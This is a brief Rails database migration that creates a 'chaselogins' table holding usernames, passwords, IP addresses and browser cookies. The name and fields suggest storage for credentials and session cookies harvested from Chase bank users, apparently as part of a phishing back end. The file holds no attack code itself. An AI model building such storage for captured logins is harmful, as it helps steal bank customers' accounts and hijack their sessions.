class CreateChaselogins < ActiveRecord::Migration[7.2]
  def change
    create_table :chaselogins do |t|
      t.string :username
      t.string :password
      t.string :ip_address
      t.text :cookies
      t.text :cookies_text

      t.timestamps
    end
  end
end
